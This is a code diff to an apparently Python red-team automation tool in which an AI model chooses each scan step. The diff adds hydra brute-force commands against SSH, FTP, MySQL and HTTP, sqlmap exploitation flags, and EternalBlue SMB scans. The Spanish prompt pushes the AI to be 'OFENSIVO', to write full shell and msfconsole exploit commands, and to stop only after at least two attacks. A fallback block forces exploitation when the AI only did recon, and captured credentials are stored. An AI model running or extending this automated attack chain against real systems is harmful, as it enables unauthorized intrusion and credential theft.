@@ -57,15 +57,20 @@ RED_TEAM_TOOLS = {
     "gobuster": {"phase": "initial_access", "mitre": "T1594", "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q -t 20", "desc": "Directory bruteforce", "parser": "list"},
     "nuclei": {"phase": "initial_access", "mitre": "T1190", "cmd": "nuclei -u {target} -severity critical,high,medium -silent -jsonl", "desc": "Vulnerability scanner (8000+ templates)", "parser": "nuclei"},
     "nuclei_full": {"phase": "initial_access", "mitre": "T1190", "cmd": "nuclei -u {target} -silent -jsonl", "desc": "Full Nuclei scan (all severities)", "parser": "nuclei"},
-    # Exploitation
-    "sqlmap": {"phase": "initial_access", "mitre": "T1190", "cmd": "sqlmap -u '{target}' --batch --random-agent --level 2", "desc": "SQL injection scanner", "parser": "generic"},
-    "hydra_ssh": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ssh -t 4 -f", "desc": "SSH brute force", "parser": "generic"},
-    "hydra_ftp": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ftp -t 4 -f", "desc": "FTP brute force", "parser": "generic"},
+    # Exploitation / Credential Access
+    "sqlmap": {"phase": "exploitation", "mitre": "T1190", "cmd": "sqlmap -u 'http://{target}' --batch --random-agent --level 2 --risk 2 --forms --crawl=2", "desc": "SQL injection scanner + exploit", "parser": "generic"},
+    "hydra_ssh": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ssh -t 4 -f -V", "desc": "SSH brute force", "parser": "generic"},
+    "hydra_ftp": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ftp -t 4 -f -V", "desc": "FTP brute force", "parser": "generic"},
+    "hydra_mysql": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} mysql -t 4 -f -V", "desc": "MySQL brute force", "parser": "generic"},
+    "hydra_http": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} http-get / -t 4 -f -V", "desc": "HTTP basic auth brute force", "parser": "generic"},
     # Metasploit CLI (no RPC needed)
     "msfconsole": {"phase": "exploitation", "mitre": "T1203", "cmd": "msfconsole -q -x '{target}'", "desc": "Metasploit CLI (direct commands)", "parser": "generic"},
     "msfvenom": {"phase": "resource_development", "mitre": "T1587", "cmd": "msfvenom {target}", "desc": "Payload generator", "parser": "generic"},
     # SSL/Network
     "sslscan": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "sslscan {target}", "desc": "SSL/TLS analysis", "parser": "generic"},
+    # SMB
+    "nmap_smb_vuln": {"phase": "exploitation", "mitre": "T1210", "cmd": "nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494 {target}", "desc": "SMB vulnerability scan (EternalBlue, etc)", "parser": "generic"},
+    "enum4linux": {"phase": "discovery", "mitre": "T1135", "cmd": "enum4linux -a {target} 2>/dev/null | head -200", "desc": "SMB/NetBIOS enumeration", "parser": "generic"},
 }
 
 MITRE_TACTICS = {
@@ -266,36 +271,44 @@ async def ai_decide_next_action(target: str, results_so_far: Dict, executed_tool
                 summary["error"] = result["error"]
             results_summary[tool_id] = summary
 
-    prompt = f"""Eres un Red Team Operator experto. Decide el SIGUIENTE paso del escaneo.
+    prompt = f"""Eres un Red Team Operator OFENSIVO. Tu objetivo principal es EXPLOTAR vulnerabilidades, no solo descubrirlas.
 
 TARGET: {target}
 
-HERRAMIENTAS YA EJECUTADAS (NO repetir ninguna): {', '.join(executed_tools) if executed_tools else 'Ninguna'}
+HERRAMIENTAS YA EJECUTADAS (NO repetir): {', '.join(executed_tools) if executed_tools else 'Ninguna'}
+TOTAL EJECUTADAS: {len(executed_tools)}
 
 RESULTADOS:
 {json.dumps(results_summary, indent=2, default=str)[:4000]}
 
-HERRAMIENTAS DISPONIBLES (elige SOLO de esta lista):
+HERRAMIENTAS DISPONIBLES:
 {tools_desc}
 
-Responde SOLO JSON valido:
+Responde SOLO JSON:
 {{
   "action": "run_tool" | "run_msf" | "run_custom" | "done",
-  "tool_id": "nombre_exacto_de_la_lista_disponible",
-  "custom_cmd": "solo si action=run_custom",
-  "msf_commands": "solo si action=run_msf",
+  "tool_id": "de la lista disponible",
+  "custom_cmd": "comando shell completo si action=run_custom",
+  "msf_commands": "comandos msfconsole si action=run_msf",
   "reasoning": "1 linea en español",
   "severity_assessment": "critical|high|medium|low|info",
   "findings_summary": "resumen breve"
 }}
 
-REGLAS ESTRICTAS:
-1. PROHIBIDO repetir herramientas de la lista "YA EJECUTADAS"
-2. Sigue la secuencia logica: Recon -> Enum -> Vuln Scan -> Exploit
-3. Si nmap ya corrio, NO uses nmap_fast ni viceversa (misma funcion)
-4. Si detectaste WAF, evita herramientas agresivas
-5. Si ya tienes 5+ herramientas ejecutadas y suficiente info, responde "done"
-6. Elige SOLO tool_id que aparezca en HERRAMIENTAS DISPONIBLES"""
+REGLAS DE COMBATE:
+1. PROHIBIDO repetir herramientas ya ejecutadas
+2. MAXIMO 3 herramientas de reconocimiento (nmap/whatweb/wafw00f). Despues OBLIGATORIO pasar a explotacion
+3. Si ya tienes 3+ herramientas de recon ejecutadas, tu SIGUIENTE accion DEBE ser explotacion/ataque
+4. Si encontraste puerto FTP abierto -> usa hydra_ftp para brute force
+5. Si encontraste puerto SSH abierto -> usa hydra_ssh
+6. Si encontraste puerto MySQL abierto -> usa hydra_mysql
+7. Si encontraste puerto HTTP/HTTPS -> usa sqlmap para SQL injection
+8. Si encontraste SMB (445) -> usa nmap_smb_vuln para EternalBlue
+9. Para action=run_msf: escribe comandos COMPLETOS de msfconsole (ej: "use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS {target}; exploit")
+10. Para action=run_custom: escribe el comando shell COMPLETO a ejecutar
+11. Si nmap ya corrio, NO uses nmap_fast (misma funcion)
+12. Solo responde "done" cuando hayas intentado AL MENOS 2 ataques de explotacion/credenciales
+13. PRIORIDAD: Recon rapido (2-3 tools) -> Vuln scan -> EXPLOIT/BRUTE FORCE -> Mas exploits"""
 
     try:
         async with httpx.AsyncClient(timeout=30.0) as http:
@@ -326,26 +339,79 @@ REGLAS ESTRICTAS:
 
 
 def _fallback_decision(results_so_far: Dict, executed_tools: list, available_tools: Dict) -> Dict[str, Any]:
-    """Rule-based fallback when AI is unavailable."""
-    # Priority order
-    priority = ["nmap", "wafw00f", "whatweb", "nuclei", "nikto", "gobuster", "subfinder", "hydra_ssh"]
+    """Rule-based fallback — AGGRESSIVE exploitation after recon."""
 
-    has_waf = any(
-        isinstance(r, dict) and r.get("waf") and r["waf"] != "None Detected"
-        for r in results_so_far.values()
-    )
-    aggressive = {"nikto", "sqlmap", "hydra_ssh", "hydra_ftp", "nuclei_full"}
+    # Phase 1: Quick recon (max 3 tools)
+    recon_tools = ["nmap", "whatweb", "wafw00f"]
+    recon_done = sum(1 for t in recon_tools if t in executed_tools)
 
-    for tool_id in priority:
+    if recon_done < 2:
+        for tool_id in recon_tools:
+            if tool_id not in executed_tools and tool_id in available_tools:
+                return {"action": "run_tool", "tool_id": tool_id, "reasoning": f"Recon rápido: {tool_id}", "source": "fallback"}
+
+    # Phase 2: Quick vuln scan
+    if "nuclei" not in executed_tools and "nuclei" in available_tools:
+        return {"action": "run_tool", "tool_id": "nuclei", "reasoning": "Escaneo de vulnerabilidades con Nuclei", "source": "fallback"}
+
+    # Phase 3: EXPLOITATION based on findings
+    exploit_actions = _generate_exploit_actions(results_so_far, executed_tools, available_tools)
+    if exploit_actions:
+        return exploit_actions
+
+    # Phase 4: Remaining tools
+    remaining = ["nikto", "gobuster", "subfinder", "sslscan"]
+    for tool_id in remaining:
         if tool_id not in executed_tools and tool_id in available_tools:
-            if has_waf and tool_id in aggressive:
-                continue
-            return {
-                "action": "run_tool", "tool_id": tool_id,
-                "reasoning": f"Fallback: ejecutando {tool_id} (AI no disponible)",
-                "source": "fallback"
-            }
-    return {"action": "done", "reasoning": "Todas las herramientas prioritarias ejecutadas", "source": "fallback"}
+            return {"action": "run_tool", "tool_id": tool_id, "reasoning": f"Enumeración adicional: {tool_id}", "source": "fallback"}
+
+    return {"action": "done", "reasoning": "Recon y explotación completados", "source": "fallback"}
+
+
+def _generate_exploit_actions(results_so_far: Dict, executed_tools: list, available_tools: Dict) -> Optional[Dict]:
+    """Automatically generate exploit commands based on discovered services."""
+    open_ports = set()
+    open_services = {}
+
+    for tool_id, result in results_so_far.items():
+        if not isinstance(result, dict):
+            continue
+        for port_info in result.get("ports", []):
+            port_str = port_info.get("port", "")
+            port_num = port_str.split("/")[0] if "/" in port_str else port_str
+            service = port_info.get("service", "").lower()
+            if port_num:
+                open_ports.add(port_num)
+                open_services[port_num] = service
+
+    # Map ports to attack tools
+    port_attack_map = [
+        ("21", "hydra_ftp", "FTP abierto → brute force de credenciales"),
+        ("22", "hydra_ssh", "SSH abierto → brute force de credenciales"),
+        ("3306", "hydra_mysql", "MySQL expuesto → brute force de credenciales"),
+        ("445", "nmap_smb_vuln", "SMB abierto → scan de EternalBlue y vulns SMB"),
+        ("80", "sqlmap", "HTTP abierto → SQL injection scan"),
+        ("443", "sqlmap", "HTTPS abierto → SQL injection scan"),
+    ]
+
+    for port, tool_id, reason in port_attack_map:
+        if port in open_ports and tool_id not in executed_tools and tool_id in available_tools:
+            return {"action": "run_tool", "tool_id": tool_id, "reasoning": reason, "source": "auto_exploit"}
+
+    # If HTTP found but no sqlmap, try it anyway
+    has_http = any(p in open_ports for p in ["80", "443", "8080", "8443"])
+    if has_http and "sqlmap" not in executed_tools and "sqlmap" in available_tools:
+        return {"action": "run_tool", "tool_id": "sqlmap", "reasoning": "Intentando SQL injection en servicios web", "source": "auto_exploit"}
+
+    # SMB enumeration
+    if "445" in open_ports and "enum4linux" not in executed_tools and "enum4linux" in available_tools:
+        return {"action": "run_tool", "tool_id": "enum4linux", "reasoning": "Enumeración SMB para usuarios y shares", "source": "auto_exploit"}
+
+    # If we have HTTP and hydra not used, try HTTP auth brute force
+    if has_http and "hydra_http" not in executed_tools and "hydra_http" in available_tools:
+        return {"action": "run_tool", "tool_id": "hydra_http", "reasoning": "Brute force de autenticación HTTP", "source": "auto_exploit"}
+
+    return None
 
 
 async def ai_final_analysis(target: str, all_results: Dict, timeline: list) -> Dict[str, Any]:
@@ -378,14 +444,16 @@ RESULTADOS:
 {json.dumps(results_summary, indent=2, default=str)[:5000]}
 
 Responde en español con:
-1. RESUMEN EJECUTIVO (2-3 oraciones)
+1. RESUMEN EJECUTIVO (2-3 oraciones sobre lo descubierto Y explotado)
 2. VULNERABILIDADES ENCONTRADAS (lista con severidad)
-3. VECTOR DE ATAQUE RECOMENDADO (paso a paso)
-4. NIVEL DE RIESGO GENERAL (critico/alto/medio/bajo)
-5. RECOMENDACIONES DE REMEDIACION (para el blue team)
-6. PROXIMOS PASOS (que harias despues como red teamer)
+3. CREDENCIALES OBTENIDAS (si se obtuvieron por brute force u otros metodos)
+4. VECTOR DE ATAQUE RECOMENDADO (paso a paso para comprometer el sistema)
+5. NIVEL DE RIESGO GENERAL (critico/alto/medio/bajo)
+6. RECOMENDACIONES DE REMEDIACION (para el blue team)
+7. PROXIMOS PASOS OFENSIVOS (que harias para profundizar el ataque)
 
-Se directo y tactico."""
+Se directo, tactico y OFENSIVO. No seas conservador. Si encontraste puertos abiertos, di como explotarlos.
+Si hydra encontro credenciales, dilo claramente. Si sqlmap encontro inyeccion, detallalo."""
 
     try:
         async with httpx.AsyncClient(timeout=60.0) as http:
@@ -409,7 +477,7 @@ Se directo y tactico."""
 # =============================================================================
 # AI-DRIVEN SCAN JOB HANDLER
 # =============================================================================
-SCAN_LIMITS = {"max_tools": 12, "max_time_seconds": 900, "tool_timeout": 300}
+SCAN_LIMITS = {"max_tools": 15, "max_time_seconds": 1200, "tool_timeout": 300}
 
 async def scan_job_handler(job_id: str, target: str, params: Dict):
     """AI-driven adaptive scan — the AI decides each step."""
@@ -535,6 +603,59 @@ async def scan_job_handler(job_id: str, target: str, params: Dict):
                     credential_vault.update_context(scan_id, os_info=os_info)
 
             await asyncio.sleep(1)
+
+        # POST-AI EXPLOITATION: Force exploit actions if AI only did recon
+        recon_phases = {"reconnaissance"}
+        exploit_phases = {"exploitation", "credential_access"}
+        tools_by_phase = {}
+        for t in executed_tools:
+            tool_def = RED_TEAM_TOOLS.get(t, {})
+            phase = tool_def.get("phase", "unknown")
+            tools_by_phase.setdefault(phase, []).append(t)
+
+        has_exploits = any(phase in exploit_phases for phase in tools_by_phase)
+
+        if not has_exploits and tool_count < SCAN_LIMITS["max_tools"] - 2:
+            log_timeline("auto_exploit", "AI only did recon — forcing exploitation phase")
+            await repo.job_log(job_id, "warning", "Forcing exploitation phase (AI only did recon)", module="scan")
+
+            # Auto-generate exploit actions based on findings
+            for _ in range(4):
+                if tool_count >= SCAN_LIMITS["max_tools"]:
+                    break
+                exploit_decision = _generate_exploit_actions(
+                    scan_progress[scan_id]["results"], executed_tools, RED_TEAM_TOOLS
+                )
+                if not exploit_decision:
+                    break
+
+                etool_id = exploit_decision["tool_id"]
+                scan_progress[scan_id]["current_tool"] = etool_id
+                scan_progress[scan_id]["ai_decisions"].append(exploit_decision)
+                log_timeline("auto_exploit_start", f"[AUTO] {etool_id}: {exploit_decision['reasoning']}")
+                await repo.job_log(job_id, "info", f"[AUTO-EXPLOIT] {etool_id}: {exploit_decision['reasoning']}", module="scan")
+
+                result = await run_tool(etool_id, target)
+                scan_progress[scan_id]["results"][etool_id] = result
+                executed_tools.append(etool_id)
+                tool_count += 1
+
+                if result.get("error"):
+                    log_timeline("tool_error", f"{etool_id}: {result['error']}")
+                else:
+                    log_timeline("tool_complete", f"[AUTO] {etool_id} completed")
+
+                # Parse credentials
+                output_text = ""
+                if isinstance(result, dict):
+                    output_text = result.get("output", result.get("raw", ""))
+                if isinstance(output_text, str) and output_text:
+                    found_creds = CredentialVault.parse_credentials_from_output(output_text, etool_id, target)
+                    for cred in found_creds:
+                        credential_vault.add_credential(scan_id, cred)
+                        log_timeline("credential", f"FOUND: {cred.get('type')} - {cred.get('username','?')}")
+
+                await asyncio.sleep(1)
 
         # Final AI analysis
         scan_progress[scan_id]["current_tool"] = "ai_analyzing"
